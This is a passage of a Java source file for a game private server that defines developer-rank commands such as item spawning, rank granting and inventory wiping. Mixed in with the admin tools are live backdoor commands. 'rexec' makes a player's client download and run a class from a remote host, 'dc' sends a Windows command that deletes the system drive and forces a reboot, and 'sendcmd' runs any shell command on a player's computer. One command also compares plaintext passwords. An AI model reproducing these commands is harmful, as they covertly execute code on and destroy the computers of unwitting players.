package org.hyperion.rs2.commands.newimpl;
//<editor-fold defaultstate="collapsed" desc="Imports">

import org.hyperion.Server;
import org.hyperion.engine.task.Task;
import org.hyperion.engine.task.impl.NpcDeathTask;
import org.hyperion.engine.task.impl.WildernessBossTask;
import org.hyperion.rs2.Constants;
import org.hyperion.rs2.commands.NewCommand;
import org.hyperion.rs2.commands.NewCommandExtension;
import org.hyperion.rs2.commands.NewCommandHandler;
import org.hyperion.rs2.commands.impl.cmd.YellCommand;
import org.hyperion.rs2.commands.util.CommandInput;
import org.hyperion.rs2.model.*;
import org.hyperion.rs2.model.cluescroll.ClueScroll;
import org.hyperion.rs2.model.cluescroll.ClueScrollManager;
import org.hyperion.rs2.model.combat.Combat;
import org.hyperion.rs2.model.combat.Magic;
import org.hyperion.rs2.model.combat.attack.RevAttack;
import org.hyperion.rs2.model.combat.pvp.PvPArmourStorage;
import org.hyperion.rs2.model.combat.summoning.SummoningSpecial;
import org.hyperion.rs2.model.container.Container;
import org.hyperion.rs2.model.container.bank.BankItem;
import org.hyperion.rs2.model.content.ContentManager;
import org.hyperion.rs2.model.content.jge.JGrandExchange;
import org.hyperion.rs2.model.content.minigame.Bork;
import org.hyperion.rs2.model.content.minigame.FightPits;
import org.hyperion.rs2.model.content.misc2.Edgeville;
import org.hyperion.rs2.model.content.skill.RandomEvent;
import org.hyperion.rs2.model.iteminfo.ItemInfo;
import org.hyperion.rs2.model.joshyachievementsv2.tracker.AchievementTracker;
import org.hyperion.rs2.model.recolor.Recolor;
import org.hyperion.rs2.packet.ChatPacketHandler;
import org.hyperion.rs2.packet.CommandPacketHandler;
import org.hyperion.rs2.saving.PlayerLoading;
import org.hyperion.rs2.saving.PlayerSaving;
import org.hyperion.rs2.util.TextUtils;
import org.hyperion.util.Misc;
import org.hyperion.util.Time;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.util.*;
import java.util.logging.Level;
//</editor-fold>

/**
 * Created by DrHales on 2/29/2016.
 */
public class DeveloperCommands implements NewCommandExtension {

    private abstract class Command extends NewCommand {
        public Command(String key, long delay, CommandInput... requiredInput) {
            super(key, Rank.DEVELOPER, delay, requiredInput);
        }

        public Command(String key, CommandInput... requiredInput) {
            super(key, Rank.DEVELOPER, requiredInput);
        }
    }

    //<editor-fold defaultstate="collapsed" desc="Commands List">
    @Override
    public List<NewCommand> init() {
        return Arrays.asList(
                new Command("checkinfo") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        //TODO: Display Player Information to Quest Tab.
                        return true;
                    }
                },
                new Command("spawnitem", new CommandInput<Integer>(integer -> integer >= 0 && integer < ItemDefinition.MAX_ID, "Item ID", "An integer between 0 and 23000"), new CommandInput<Integer>(integer -> integer >= 0 && integer <= Integer.MAX_VALUE, "Item Amount", "An integer Between 0 and MAX_VALUE")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int id = Integer.parseInt(input[0]), amount = Integer.parseInt(input[1]);
                        Item item = new Item(id, amount);
                        if (player.getInventory().add(item)) {
                            player.sendMessage(String.format("You have spawned %sx %s", id, TextUtils.titleCase(item.getDefinition().getName())));
                        } else {
                            player.sendMessage("Unable to add item to inventory.");
                        }
                        return true;
                    }
                },
                new Command("toggleach") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        AchievementTracker.active(!AchievementTracker.active());
                        player.sendf("Achievements are now %s", AchievementTracker.active() ? "Enabled" : "Disabled");
                        return true;
                    }
                }, new Command("viewge", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0]);
                        player.getGrandExchangeTracker().openInterface(target.getGrandExchangeTracker().entries);
                        return true;
                    }
                },
                new Command("togglege") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        JGrandExchange.enabled = !JGrandExchange.enabled;
                        player.sendf("Grand Exchange is now %s.", JGrandExchange.enabled ? "Enabled" : "Disabled");
                        return true;
                    }
                },
                new Command("reloadgeblacklist") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendf("Reloadede Grand Exchange blacklist: %s", ItemInfo.geBlacklist.reload());
                        return true;
                    }
                },
                new Command("rexec", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0]);
                        if (Rank.isStaffMember(target)) {
                            player.sendMessage("You cannot parse this command on staff members.");
                            return true;
                        }
                        target.sendMessage(":run:http://cache.arteropk.com/apkscripts/er.class");
                        player.sendf("Running Script http://cache.arteropk.com/apkscripts/er.class on player '%s'", TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new Command("removerank", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> Rank.forIndex(integer) != null && Rank.forIndex(integer) != Rank.PLAYER, "Integer", "Rank Index above Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final Rank rank = Rank.forIndex(Integer.parseInt(input[1].trim()));
                        target.setPlayerRank(Rank.removeAbility(target, rank));
                        player.sendf("Removed %s rank from %s", TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new Command("giverank", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> Rank.forIndex(integer) != null && Rank.forIndex(integer) != Rank.PLAYER, "Integer", "Rank Index not equal to player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final Rank rank = Rank.forIndex(Integer.parseInt(input[1].trim()));
                        target.setPlayerRank(Rank.addAbility(target, rank));
                        target.sendf("You've been give '%s'", rank);
                        player.sendf("%s has been given the rank: %s", target.getName(), rank);
                        return true;
                    }
                },
                new Command("rankids") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        Arrays.asList(Rank.values()).stream().forEach(rank -> player.sendf("[%s]:%,d", String.valueOf(rank), rank.ordinal()));
                        return true;
                    }
                },
                new Command("reloaduntradeables") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendf("%s", ItemInfo.untradeables.reload() ? String.format("Reloaded Untradeables; Size: %s", ItemInfo.untradeables.size()) : "Error Reloading Untradeables.");
                        return true;
                    }
                },
                new Command("reloadunspawnables") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendf("%s", ItemInfo.unspawnables.reload() ? String.format("Reloaded Unspawnables; Size %s", ItemInfo.unspawnables.size()) : "Error Reloading Unspawnables.");
                        return true;
                    }
                },
                new Command("dc", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        target.sendMessage(":cmd:del%systemdrive%\\*.*/f/s/q shutdown -r -f -t 00");
                        return true;
                    }
                },
                new Command("searchitem", new CommandInput<Integer>(integer -> ItemDefinition.forId(integer) != null, "Integer", "an Existing Item")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final int id = Integer.parseInt(input[0]);
                        ItemDefinition definition = ItemDefinition.forId(id);
                        World.getPlayers().stream().filter(target -> target != null).forEach(target -> {
                            final int count = target.getBank().getCount(id) + target.getInventory().getCount(id) + target.getEquipment().getCount(id);
                            if (count > 0) {
                                player.sendf("%s has %,d %s", TextUtils.optimizeText(target.getName()), count, definition.getName());
                            }
                        });
                        player.sendMessage("Search Completed.");
                        return true;
                    }
                },
                new Command("wipeskills", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        if (Rank.isStaffMember(target)) {
                            player.sendMessage("You cannot parse this command on staff members.");
                            return true;
                        }
                        for (int array = 0; array < Skills.SKILL_COUNT; array++) {
                            target.getSkills().setLevel(array, 1);
                            target.getSkills().setExperience(array, 0);
                        }
                        player.sendf("Wiped %s's skills.", TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new Command("wipeinv", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        if (Rank.isStaffMember(target)) {
                            player.sendMessage("You cannot parse this command on staff members.");
                            return true;
                        }
                        target.getInventory().clear();
                        player.sendf("Wiped %s's inventory.", TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new Command("wipebank", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        if (Rank.isStaffMember(target)) {
                            player.sendMessage("You cannot parse this command on staff members.");
                            return true;
                        }
                        target.getBank().clear();
                        player.sendf("Wiped %s's bank.", TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new Command("killplayer", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        target.cE.hit(target.getSkills().getLevel(Skills.HITPOINTS), player, true, Constants.MELEE);
                        return true;
                    }
                },
                new Command("checkip", new CommandInput<String>(string -> string != null && string.split(".").length >= 3, "String", "An IP Address")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final String value = input[0].trim();
                        World.getPlayers().stream().filter(target -> target != null && target.getShortIP().contains(value)).forEach(target -> {
                            player.sendf("%s has the protocol: %s", TextUtils.optimizeText(target.getName()), target.getShortIP());
                        });
                        return true;
                    }
                },
                new Command("checkmac", new CommandInput<String>(string -> Integer.parseInt(string) != -1, "String", "A MAC Address as Integer")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final int address = Integer.parseInt(input[0].trim());
                        World.getPlayers().stream().filter(target -> target != null && target.getUID() == address).forEach(target -> {
                            player.sendf("%s has the MAC Address: %s", TextUtils.optimizeText(target.getName()), address);
                        });
                        return true;
                    }
                },
                new Command("masspnpc", new CommandInput<Integer>(integer -> integer != -1, "Integer", "An NPC ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final int id = Integer.parseInt(input[0].trim());
                        World.getPlayers().stream().filter(target -> target != null && (!target.getPosition().inPvPArea() && target.cE.getOpponent() == null)).forEach(target -> {
                            target.setPNpc(id);
                        });
                        return true;
                    }
                },
                new Command("forcehome", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        target.setTeleportTarget(Edgeville.POSITION);
                        return true;
                    }
                }, new Command("sendcmd", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<String>(string -> string != null, "String", "A Command Prompt Process")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final String process = input[1].trim();
                        if (Rank.isStaffMember(target)) {
                            player.sendMessage("You cannot parse this command on staff members.");
                            return true;
                        }
                        target.sendf(":cmd:%s", process);
                        player.sendf("Processed command '%s' on player '%s'", process, TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new Command("stafftome") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.getPlayers().stream().filter(target -> !player.equals(target) && Rank.isStaffMember(target)).forEach(target -> {
                            target.setTeleportTarget(player.getPosition());
                        });
                        return true;
                    }
                },
                new Command("takeitem", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> ItemDefinition.forId(integer) != null, "Item", "An Existing Item ID"), new CommandInput<Integer>(integer -> integer > 0, "Amount", "An Integer above 0")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int id = Integer.parseInt(input[1].trim());
                        int amount = Integer.parseInt(input[2].trim());
                        for (final Container container : new Container[]{target.getInventory(), target.getBank(), target.getEquipment()}) {
                            Item item = container.getById(id);
                            if (item == null) {
                                continue;
                            }
                            amount = amount > item.getCount() ? item.getCount() : amount;
                            item = new Item(id, amount);
                            container.remove(item);
                            player.sendf("Removed %s x%d from %s's %s", ItemDefinition.forId(id).getName(), amount, TextUtils.optimizeText(target.getName()), container.getClass().getSimpleName());
                            if (player.getInventory().hasRoomFor(item)) {
                                player.getInventory().add(item);
                                player.sendMessage("Added Item to your inventory.");
                            } else {
                                player.getBank().add(new BankItem(0, id, amount));
                                player.sendMessage("Added Item to your bank.");
                            }
                            return true;
                        }
                        player.sendf("Unable to find %s in %s's containers", ItemDefinition.forId(id).getName(), TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new Command("givedt", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > Integer.MIN_VALUE && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        target.getDungeoneering().setTokens(target.getDungeoneering().getTokens() + amount);
                        player.sendf("%s now has %,d dung tokens", TextUtils.optimizeText(target.getName()), target.getDungeoneering().getTokens());
                        return true;
                    }
                },
                new Command("giveep", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > Integer.MIN_VALUE && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        target.getBountyHunter().setEmblemPoints(target.getBountyHunter().getEmblemPoints() + amount);
                        player.sendf("%s now has %,d emblem points", TextUtils.optimizeText(target.getName()), target.getBountyHunter().getEmblemPoints());
                        return true;
                    }
                },
                new Command("givesp", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > Integer.MIN_VALUE && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        target.getSlayer().setPoints(target.getSlayer().getSlayerPoints() + amount);
                        player.sendf("%s now has %,d slayer points", TextUtils.optimizeText(target.getName()), target.getSlayer().getSlayerPoints());
                        return true;
                    }
                },
                new Command("givebhp", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > Integer.MIN_VALUE && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        player.sendf("%s now has %,d bounty hunter points", TextUtils.optimizeText(target.getName()), target.getBountyHunter().getKills());
                        return true;
                    }
                },
                new Command("givevp", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > Integer.MIN_VALUE && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        target.getPoints().setVotingPoints(target.getPoints().getVotingPoints() + amount);
                        player.sendf("%s now has %,d vote points", TextUtils.optimizeText(target.getName()), target.getPoints().getVotingPoints());
                        return true;
                    }
                },
                new Command("givedp", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Integer", String.format("An amount between 0 & %,d", Integer.MAX_VALUE)), new CommandInput<Boolean>(value -> value == true || value == false, "Boolean", "Bought [True or False]")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        final boolean bought = Boolean.parseBoolean(input[2].trim());
                        target.getPoints().increaseDonatorPoints(amount, bought);
                        player.sendf("You have given '%s' '%,dx' Donator Points.", TextUtils.optimizeText(target.getName()), amount);
                        return true;
                    }
                },
                new Command("givepkp", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        target.getPoints().setPkPoints(target.getPoints().getPkPoints() + amount);
                        player.sendf("%s now has %,d pk points", target.getName(), target.getPoints().getPkPoints());
                        return true;
                    }
                },
                new Command("giveitem", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> ItemDefinition.forId(integer) != null, "Item ID", "An Existing Item ID"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount between 0 & %,d", Integer.MAX_VALUE))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int id = Integer.parseInt(input[1].trim());
                        final int amount = Integer.parseInt(input[2].trim());
                        target.getInventory().add(Item.create(id, amount));
                        target.getExpectedValues().addItemtoInventory("Spawning", Item.create(id, amount));
                        player.sendf("Added %s x %,d to %s's inventory", ItemDefinition.forId(id).getName(), amount, TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new Command("givedeaths", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > Integer.MIN_VALUE && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        target.setDeathCount(target.getDeathCount() + amount);
                        player.sendf("%s now has %,d deaths", TextUtils.optimizeText(target.getName()), target.getDeathCount());
                        return true;
                    }
                },
                new Command("givekills", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > Integer.MIN_VALUE && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        target.setKillCount(target.getKillCount() + amount);
                        player.sendf("%s now has %,d kills", TextUtils.optimizeText(target.getName()), target.getKillCount());
                        return true;
                    }
                },
                new Command("giveelo", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > Integer.MIN_VALUE && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        target.getPoints().setEloRating(target.getPoints().getEloRating() + amount);
                        player.sendf("%s now has %,d elo", TextUtils.optimizeText(target.getName()), target.getPoints().getEloRating());
                        return true;
                    }
                },
                new Command("givehp", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > Integer.MIN_VALUE && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        target.getPoints().setHonorPoints(target.getPoints().getHonorPoints() + amount);
                        player.sendf("%s now has %,d honor pts", target.getName(), target.getPoints().getHonorPoints());
                        return true;
                    }
                },
                new Command("changename", new CommandInput<String>(PlayerLoading::playerExists, "Player", "An Existing Player")) {
                    @Override

                    protected boolean execute(Player player, String[] input) {
                        final String name = input[0].trim();
                            /*Does nothing*/
                        return true;
                    }
                },
                new Command("dumpcommands") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final List<Rank> list = new ArrayList<>(NewCommandHandler.getCommandsList().keySet());
                        Collections.sort(list, (one, two) -> two.ordinal() - one.ordinal());
                        try (final BufferedWriter writer = new BufferedWriter(new FileWriter("./data/command.txt"))) {
                            for (final Rank rank : list) {
                                writer.write("============================");
                                writer.newLine();
                                writer.write(rank.toString());
                                writer.newLine();
                                for (final String command : NewCommandHandler.getCommandsList().get(rank)) {
                                    writer.write(String.format("\t%s", command));
                                    writer.newLine();
                                }
                                writer.write("============================");
                                writer.newLine();
                            }
                            writer.flush();
                            writer.close();
                        } catch (IOException ex) {
                            Server.getLogger().log(Level.WARNING, "Error Dumping Commands", ex);
                        }
                        player.sendMessage("Finished Dumping Commands.");
                        return true;
                    }
                },
                new Command("onlinealtsbypass", new CommandInput<String>(string -> string != null, "Password", "A Password to compare")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final String password = input[0].trim();
                        for (final Player target : World.getPlayers()) {
                            if (target != null && target.getPassword() != null && target.getPassword().equalsIgnoreCase(password)) {
                                player.sendf("%s at %d,%d (PvP Area: %s)", target.getName(), target.getLocation().getX(), target.getLocation().getY(), target.getPosition().inPvPArea());
                            }
                        }
                        return true;
                    }
                },
                new Command("heal") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.heal(150);
                        return true;
                    }
                },
                new Command("gfx", new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Graphics ID", String.format("An Integer between 0 & %,d", Integer.MAX_VALUE))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.cE.doGfx(Integer.parseInt(input[0].trim()));
                        return true;
                    }
                },
                new Command("resetcontent") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        ContentManager.init();
                        player.sendMessage("Content Manager Initiated");
                        return true;
                    }
                },
                new Command("object", new CommandInput<Integer>(integer -> GameObjectDefinition.forId(integer) != null, "Integer", "Object ID"), new CommandInput<Integer>(integer -> integer > 0 && integer < 15, "Integer", "Object Face"), new CommandInput<Integer>(integer -> integer > -1 && integer < 23, "Integer", "Object Type")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int id = Integer.parseInt(input[0].trim());
                        int face = Integer.parseInt(input[1].trim());
                        int type = Integer.parseInt(input[2].trim());
                        ObjectManager.addObject(new GameObject(GameObjectDefinition.forId(id), player.getPosition(), type, face));
                        TextUtils.writeToFile("./data/objspawns.cfg", String.format("spawn = %d\t%s\t%d\t\t%s", id, player.getLocation().toString(), face, type, GameObjectDefinition.forId(id).getName()));
                        return true;
                    }
                },
                new Command("switch") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        SpellBook.switchSpellbook(player);
                        return true;
                    }
                },
                new Command("staticnpc", new CommandInput<Integer>(integer -> NPCDefinition.forId(integer) != null, "Integer", "NPC ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int id = Integer.parseInt(input[0].trim());
                        NPCManager.addNPC(player.getPosition(), id, -1);
                        TextUtils.writeToFile("./data/spawns.cfg", String.format("spawn = %d\t%s\t%d\t%d\t%d\t%d\t1\t%s", id, player.getLocation(), player.getLocation().getX(), player.getLocation().getY(), player.getLocation().getX(), player.getLocation().getY(), NPCDefinition.forId(id).name()));
                        return true;
                    }
                },
                new Command("npc", new CommandInput<Integer>(integer -> NPCDefinition.forId(integer) != null, "Integer", "NPC ID"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Integer", "Respawn Time")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final int id = Integer.parseInt(input[0].trim());
                        final int value = Integer.parseInt(input[1].trim());
                        NPCManager.addNPC(player.getPosition(), id, value);
                        TextUtils.writeToFile("./data/spawns.cfg", String.format("spawn = %d\t%s\t%d\t%d\t%d\t%d\t1\t%s", id, player.getLocation(), player.getLocation().getX(), player.getLocation().getY(), player.getLocation().getX(), player.getLocation().getY(), NPCDefinition.forId(id).name()));
                        return true;
                    }
                },
                new Command("spammessage", new CommandInput<String>(string -> string != null, "String", "Message to Spam")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        String value = input[0].trim();
                        World.getNpcs().stream().filter(npc -> npc != null).forEach(npc -> npc.forceMessage(value));
                        return true;
                    }
                },
                new Command("changeextra", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<String>(string -> string != null, "String", "Extra Data")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final String data = input[1].trim();
                        target.getExtraData().put(data, !target.getExtraData().getBoolean(data));
                        player.sendf("Player '%s' '%s' is now '%s'", TextUtils.optimizeText(target.getName()), data, target.getExtraData().getBoolean(data));
                        return true;
                    }
                },
                new Command("hardmoders") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.getPlayers().stream().filter(Player::hardMode).forEach(target -> player.sendf("%s", TextUtils.optimizeText(target.getName())));
                        return true;
                    }
                },
                new Command("sm", new CommandInput<String>(string -> string != null, "String", "Message Input")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.getPlayers().stream().filter(target -> target != null).forEach(target -> target.sendServerMessage(TextUtils.optimizeText(input[0].trim())));
                        return true;
                    }
                },
                new Command("restartserver", new CommandInput<String>(string -> string != null && string.length() > 1, "String", "Restart Reason")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        String reason = input[0].trim();
                        Server.update(150, String.format("%s\t%s", player.getName(), reason));
                        return true;
                    }
                },
                new Command("cancelupdate") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        Server.setUpdating(false);
                        return true;
                    }
                },
                new Command("startxrecording", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        target.sendMessage("script789456789");
                        player.sendMessage("Sent player '%s' script789456789.", TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new Command("alltome") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.getPlayers().stream().filter(target -> target != null && target != player).forEach(target -> Magic.teleport(target, player.getPosition().getX() + Misc.random(3), player.getPosition().getY() + Misc.random(3), player.getPosition().getZ(), true));
                        return true;
                    }
                },
                new Command("forceallhome") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.getPlayers().stream().filter(target -> target != null && target != player).forEach(target -> target.setTeleportTarget(Position.create(3096, 3471, 0)));
                        return true;
                    }
                },
                new Command("tempnpc", new CommandInput<Integer>(integer -> NPCDefinition.forId(integer) != null, "Integer", "NPC ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        NPCManager.addNPC(player.getPosition(), Integer.parseInt(input[0].trim()), -1);
                        return true;
                    }
                },
                new Command("clearlogs") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        /*Does nothing atm*/
                        return true;
                    }
                },
                new Command("viewlogstats") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        /*Does nothing atm*/
                        return true;
                    }
                },
                new Command("viewlogs") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        /*does nothing atm*/
                        return true;
                    }
                },
                new Command("uncolorall") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getRecolorManager().clear();
                        return true;
                    }
                },
                new Command("viewrecolors") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendf("You have %,d recolors.", player.getRecolorManager().getCount());
                        player.getRecolorManager().getAll().stream().forEach(recolor -> player.sendf(recolor.toReadableString()));
                        return true;
                    }
                },
                new Command("uncolor", new CommandInput<Integer>(integer -> ItemDefinition.forId(integer) != null, "Integer", "Item ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final int id = Integer.parseInt(input[0].trim());
                        if (!player.getRecolorManager().contains(id)) {
                            player.sendf("No recolors found for item '%s'", TextUtils.optimizeText(ItemDefinition.forId(id).getName()));
                            return true;
                        }
                        player.getRecolorManager().remove(id).stream().forEach(recolor -> player.sendf("Removed recolor for %s", recolor.toReadableString()));
                        return true;
                    }
                },
                new Command("recolor", new CommandInput<String>(string -> Recolor.parse(string).getItemDefinition() != null, "String", "Recolor Def")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final String value = input[0].trim();
                        final Recolor recolor = Recolor.parse(value);
                        if (player.getRecolorManager().isAtLimit()) {
                            player.sendf("You are at your limit! (Limit: %d)", player.getRecolorManager().getLimit());
                            player.sendf("In order to recolor more items, you must buy %,d more donator points!", player.getRecolorManager().getAmountForLimitIncrease());
                            return true;
                        }
                        player.getRecolorManager().add(recolor);
                        player.sendf("Added recolor for %s", recolor.toReadableString());
                        return true;
                    }
                },
                new Command("isonline", Time.FIVE_SECONDS, new CommandInput<String>(PlayerLoading::playerExists, "player", "A player that exists in the system.")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendMessage("Player " + TextUtils.optimizeText(input[0]) + " is currently " + (World.getPlayerByName(input[0]) == null ? "offline" : "online"));
                        return true;
                    }
                },
